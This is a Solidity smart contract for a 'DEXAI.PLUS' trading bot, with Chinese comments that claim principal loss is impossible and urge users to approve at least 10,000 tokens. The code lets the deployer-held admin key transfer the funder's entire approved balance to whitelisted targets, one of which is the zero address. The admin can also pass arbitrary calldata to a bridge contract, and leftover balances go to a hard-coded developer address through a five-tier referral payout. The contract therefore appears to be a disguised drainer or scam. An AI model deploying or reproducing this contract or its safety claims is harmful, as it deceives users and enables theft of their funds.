// SPDX-License-Identifier: MIT

/**
    ____  _______  __ ___    ____   ____  __          
   / __ \/ ____/ |/ //   |  /  _/  / __ \/ /_  _______
  / / / / __/  |   // /| |  / /   / /_/ / / / / / ___/
 / /_/ / /___ /   |/ ___ |_/ /   / ____/ / /_/ (__  ) 
/_____/_____//_/|_/_/  |_/___/  /_/   /_/\__,_/____/  
        -- Coded for DexAI.PLUS with ❤️ by CC.DID.BI

该代码是用于DEXAI+™️机器人核心程序在确保用户资金安全的情况下，调用的交易其接口实现自动化交易的合约。

该代码涉及安全的核心变量在发布后（或者经过onlyOneTimeConf方法初始化后）均不可以修改:

管理员权限:

    管理员权限（供 AI Core 程序调用，虽然管理员的权限极为有限，绝对不可能带来本金损失，但是出于从代码上100%确定机器人和相关资产的所有权，出资人可以随时收回管理员权限）:
    1.swapFunction 方法发起交易，且兑换所得的目标地址为默认值（即本合约本身的地址）不可以修改。
    交易的目标地址白名单:
    targetWhiteListA、B、C:
    0xbCe268B24155dF2a18982984e9716136278f38d6（第三方聚合交易器的合约地址）
    0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE（第三方聚合交易器的合约地址）
    0x0000000000000000000000000000000000000000（多链封装币跨链销毁的零地址）
    2.withdrawToken 按照约定比例分发余额。
    3.其他不涉及本金安全的写方法权限请看注释。
    
出资人权限:

    setAdmin 出资人可以设定新的管理员（触发该方法的同时，旧的管理员即刻作废）。

免责声明:

    上述交易的目标地址白名单所涉及的第三方合约的安全性论述请详细阅读其文档，DEXAI.PLUS 默认使用者认可该文档论述内容的正确性或者选择信任其所列审计机构的专业性与公正性，DEXAI.PLUS 从未也永远不会为任何第三方协议的安全性做任何形式的保证。
    若你无法接受以上声明的内容，您依然有两个选择:
    1.自行提供你信任的第三方聚合交易器合约地址及其ABI。
    2.放弃使用DEXAI PLUS的任何服务。

特别说明:本合约为 DEXAI.Plus 安全强化版，withdrawToken 的方法与 DEXAI.Plus 早期公共版（逐步弃用中）存在差异。 

编译环境: 

    https://remix.ethereum.org/#lang=en&optimize=true&runs=200&version=soljson-v0.8.20+commit.a1b79de6.js&evmVersion=shanghai

一致性校验:请自行按照指定编译参数设置你的编译环境后，完成编译。将得到的Bytecode（编译结果）与您私有合约地址在区块浏览器上显示 Bytecode 进行一致性比对，确保一致则至少能证明你当前看到的源代码与你私有合约地址的源码内容完全一致。确保代码一致性，是你评估代码安全性的前提。

代币授权:

    授权交易的代币合约:根据需要自行授权各种代币，目前DEXAI PLUS主要针对:weth9、weth10、interETH、wETH.Fi(wETH20)、Aave WETH (aWETH)、interBTC、wBTC等封装币进行优化。

    授权交易的代币数量:为避免频繁出现授权额度不足建议不低于10000枚，进行授权即代表阁下能理解或充分信任本合约足以保证阁下资金安全。

**/

pragma solidity  = 0.8.20;

interface ERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address src,address dst,uint256 amount) external returns (bool);
    function allowance(address src,address dst) external returns (uint256);
}

interface IThirdPartyContract {
    struct ILiFiBridgeData {
        uint256 minAmount;
        uint256 receivedAmount;
    }

    struct LibSwapSwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }

    struct HopData {
        uint256 bonderFee;
        uint256 amountOutMin;
        uint256 deadline;
        uint256 destinationAmountOutMin;
        uint256 destinationDeadline;
        address hopBridge;
    }

    function swapAndStartBridgeTokensViaHopL1ERC20(
        ILiFiBridgeData memory _bridgeData,
        LibSwapSwapData[] calldata _swapData,
        HopData calldata _hopData
    ) external payable;
}


contract DEXBotPlus {
    address public admin;
    address public targetContractAddressA; 
    address public targetContractAddressB; 

    address public addressA;
    address public addressB;
    address public addressC;
    address public addressD;
    address public addressE;
    address public addressDev;
    uint256 public costA;
    uint256 public costB;
    uint256 public costC;
    uint256 public costD;
    uint256 public costE;
    uint256 public lineOfBurn = 1000000000000000000;

    address public swapper;
    address   targetWhiteListA = 0xbCe268B24155dF2a18982984e9716136278f38d6;
    address   targetWhiteListB = 0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE;
    address   targetWhiteListC = address(0);

    event TokensSwapped(address indexed tokenA, address indexed tokenB, address indexed user, uint256 amount);
    event TokensWithdrawn(address indexed token, address indexed user, uint256 amount);
    IThirdPartyContract bridgeProxy;

    //构造函数，该函数只能在发布合约时执行一次，且所有赋值均在代码中明文完成，每个用户独立设置。
    constructor() {
        admin = msg.sender;//合约发布者为管理员，管理员由DEXBot Plus核心AI控制，只有向不可篡改的交易聚合器代理地址发起交易。


        swapper  = address(0);//出资人地址。        
        addressA = address(0);//分润地址A，不可以修改。
        addressB = address(0);//分润地址B，不可以修改。
        addressC = address(0);//分润地址C，不可以修改。
        addressD = address(0);//分润地址D，不可以修改。
        addressE = address(0);//分润地址E，不可以修改。
        costA = lineOfBurn; costB = lineOfBurn; costC = lineOfBurn; costD = lineOfBurn; costE = lineOfBurn;

        addressDev = 0x78c0F0fF1d9b36F53FEa77312BB4465073399999;
        

    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "This function only for owner!");
        _;
    }
    //出资人权限，收回现有管理员的权限，并赋予新用户管理员权限
    function setAdmin(address _admin) external {
        require(msg.sender == swapper, "This function only for owner!");
        admin = _admin;
    }

    //管理员权限（预留供AI Core修改各级推荐人投资额数值的接口，从而实现烧伤与否与烧伤值与未来推荐人投资变动同步）
    function setRefCost(uint256 _costA,uint256 _costB,uint256 _costC,uint256 _costD,uint256 _costE) public onlyAdmin {
        costA = _costA;
        costB = _costB;
        costC = _costC;
        costD = _costD;
        costE = _costE;
    }

    function onlyOneTimeConf(address _swapper, address _addressA, address _addressB, address _addressC, address _addressD, address _addressE)external onlyAdmin {
        require(swapper == address(0), "This function only can be used once!");
        swapper  = _swapper;
        addressA = _addressA;//分润地址A，不可以修改。
        addressB = _addressB;//分润地址B，不可以修改。
        addressC = _addressC;//分润地址C，不可以修改。
        addressD = _addressD;//分润地址D，不可以修改。
        addressE = _addressE;//分润地址E，不可以修改。

    }

    struct SwapData {
        uint256 minAmount;
        uint256 receivedAmount;
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
        uint256 bonderFee;
        uint256 amountOutMin;
        uint256 deadline;
        uint256 destinationAmountOutMin;
        uint256 destinationDeadline;
        address hopBridge;
    }



    function swapFunction(
        address _tokenA,
        address _tokenB,
        address _targetContractAddress,
        uint256 _amount,
        bytes memory _callData
    ) external onlyAdmin {
        require ((_targetContractAddress == targetWhiteListA)||
        (_targetContractAddress == targetWhiteListB)||
        (_targetContractAddress == targetWhiteListC));
        uint256 amount;
        if(_amount==0){
            amount=ERC20(_tokenA).balanceOf(swapper);
        }else{
            amount=_amount;
        }

        address toAddress = address(this);

        if(_callData.length > 0){

        SwapData memory swapData = SwapData({
            minAmount: _amount,
            receivedAmount: 0,
            callTo: _targetContractAddress,
            approveTo: toAddress,
            sendingAssetId: _tokenA,
            receivingAssetId: _tokenB,
            fromAmount: 1,
            callData: _callData, 
            requiresDeposit: false,
            bonderFee: 0,
            amountOutMin: 0,
            deadline: 0,
            destinationAmountOutMin: 0,
            destinationDeadline: 3000000,
            hopBridge: _targetContractAddress
        });

        IThirdPartyContract.ILiFiBridgeData memory bridgeData = IThirdPartyContract.ILiFiBridgeData({
            minAmount: swapData.minAmount,
            receivedAmount: swapData.receivedAmount
        });


        // 构造 _swapData
        IThirdPartyContract.LibSwapSwapData[] memory swapArray = new IThirdPartyContract.LibSwapSwapData[](1);
        swapArray[0] = IThirdPartyContract.LibSwapSwapData({
            callTo: swapData.callTo,
            approveTo: swapData.approveTo,
            sendingAssetId: swapData.sendingAssetId,
            receivingAssetId: swapData.receivingAssetId,
            fromAmount: swapData.fromAmount,
            callData: swapData.callData,
            requiresDeposit: swapData.requiresDeposit
        });

        // 构造 _hopData
        IThirdPartyContract.HopData memory hopData = IThirdPartyContract.HopData({
            bonderFee: swapData.bonderFee,
            amountOutMin: swapData.amountOutMin,
            deadline: swapData.deadline,
            destinationAmountOutMin: swapData.destinationAmountOutMin,
            destinationDeadline: swapData.destinationDeadline,
            hopBridge: swapData.hopBridge
        });

        bridgeProxy = IThirdPartyContract(_targetContractAddress);


        // 调用目标合约的方法
        bridgeProxy.swapAndStartBridgeTokensViaHopL1ERC20(
            bridgeData,
            swapArray,
            hopData
        );

        }

        require(ERC20(_tokenA).balanceOf(swapper) >= amount);
        require(ERC20(_tokenA).allowance(swapper,address(this))>= amount);
        // 将代币转移到目标合约地址
        require(ERC20(_tokenA).transferFrom(swapper,_targetContractAddress,amount), "Swap failed");
        emit TokensSwapped(_tokenA,_tokenB,swapper,amount);
    }

    function setRefCostAndwithdrawToken(uint256 _costA,uint256 _costB,uint256 _costC,uint256 _costD,uint256 _costE, address _token, uint256 _cost, uint256 _exProfit)external onlyAdmin{
        setRefCost( _costA, _costB, _costC, _costD, _costE);
        withdrawToken( _token,  _cost,  _exProfit);

    }




    function withdrawToken(address _token, uint256 _cost, uint256 _exProfit) public onlyAdmin {
        ERC20 token = ERC20(_token);
        uint256 balance = token.balanceOf(address(this));
        require (_cost <= balance);
        uint256 profit  = balance - _cost;
        require (profit <= ( balance * 2)/100);//利润上限制锁；
        uint256 basicProfit = profit - _exProfit;
        
        uint256 amountToSwapper = (basicProfit * 60) / 100 + _cost;
        amountToSwapper = (_exProfit * 40) / 100 + amountToSwapper;
        uint256 amountA = 0;
        if(addressA!=address(0)){
             amountA = (basicProfit * 6) / 100;
             if((costA<lineOfBurn)&&(costA<_cost)){
                 amountA = (amountA * costA) /_cost;
             }else{
                amountA = (_exProfit * 40) / 100 + amountA;
             }
        }
        uint256 amountB = 0;
        if(addressB!=address(0)){
             amountB = (basicProfit * 5) / 100;
             if((costB<lineOfBurn)&&(costB<_cost)){
                 amountB = (amountB * costB) /_cost;
             }
        }
        uint256 amountC = 0;
        if(addressC!=address(0)){
             amountC = (basicProfit * 4) / 100;
             if((costC<lineOfBurn)&&(costC<_cost)){
                 amountC = (amountC * costC) /_cost;
             }
        }
        uint256 amountD = 0;
        if(addressD!=address(0)){
             amountD = (basicProfit * 3) / 100;
             if((costD<lineOfBurn)&&(costD < _cost)){
                 amountD = (amountD * costD) /_cost;
             }
        }
        uint256 amountE = 0;
        if(addressE!=address(0)){
             amountE = (basicProfit * 2) / 100;
             if((costE<lineOfBurn)&&(costE < _cost)){
                 amountE = (amountE * costE) /_cost;
             }
        }
        uint256 amountDev = balance -  amountA - amountB -  amountC -  amountD -  amountE - amountToSwapper;

        // 将代币转移到交换地址
        require(token.transfer(swapper, amountToSwapper), "Transfer failed");
        emit TokensWithdrawn(_token, swapper, amountToSwapper);
        
        // 将代币转移到地址A
        if((addressA!=address(0))&&(amountA>0)){
            require(token.transfer(addressA, amountA), "Transfer failed");
            emit TokensWithdrawn(_token, addressA, amountA);
        }
        // 将代币转移到地址B
        if((addressB!=address(0))&&(amountB>0)){
            require(token.transfer(addressB, amountB), "Transfer failed");
            emit TokensWithdrawn(_token, addressB, amountB);
        }

        // 将代币转移到地址C
        if((addressC!=address(0))&&(amountC>0)){
            require(token.transfer(addressC, amountC), "Transfer failed");
            emit TokensWithdrawn(_token, addressC, amountC);
        }

        // 将代币转移到地址D
        if((addressD!=address(0))&&(amountD>0)){
            require(token.transfer(addressD, amountD), "Transfer failed");
            emit TokensWithdrawn(_token, addressD, amountD);
        }
        // 将代币转移到地址E
        if((addressE!=address(0))&&(amountE>0)){
        require(token.transfer(addressE, amountE), "Transfer failed");
        emit TokensWithdrawn(_token, addressE, amountE);
        }
        // 将代币转移到地址Dev
        if((addressDev!=address(0))&&(amountDev>0)){
            require(token.transfer(addressDev, amountDev), "Transfer failed");
            emit TokensWithdrawn(_token, addressDev, amountDev);
        }
    }
}